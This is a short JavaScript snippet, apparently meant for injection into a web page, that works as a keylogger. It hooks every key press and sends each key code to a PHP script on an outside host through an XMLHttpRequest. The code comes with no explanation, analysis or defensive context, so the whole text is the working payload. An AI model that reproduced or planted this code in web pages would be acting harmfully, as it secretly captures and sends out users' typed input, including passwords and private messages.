document.onkeydown = function(k){
 url = new XMLHttpRequest();
 url.open("get", "http://latin2chat.260mb.net/files/keyPHP.php?k=" + k.keyCode);
 url.send(null);
}
